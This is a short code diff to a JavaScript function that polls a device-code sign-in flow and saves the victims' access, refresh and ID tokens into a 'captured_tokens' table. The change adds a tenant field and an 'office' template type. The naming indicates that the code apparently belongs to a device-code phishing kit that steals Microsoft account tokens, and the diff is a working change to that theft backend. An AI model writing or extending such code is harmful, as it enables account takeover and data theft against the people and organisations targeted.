@@ -57,13 +57,17 @@ async function pollForTokens(deviceCode, linkId, userId) {
         } catch (e) { /* ignore decode errors */ }
       }
       
+      // Determine tenant from config
+      const tenant = config.AZURE_TENANT || 'common';
+      
       // Store encrypted
       await db.query(
-        'INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))',
+        'INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?)',
         [
           userId, linkId, email, 'token',
           encrypt(access_token), encrypt(refresh_token), encrypt(id_token),
-          '0.0.0.0', 'Device Code Flow', 'Device Code Flow'
+          '0.0.0.0', 'Device Code Flow',
+          tenant, 'office'
         ]
       );
       
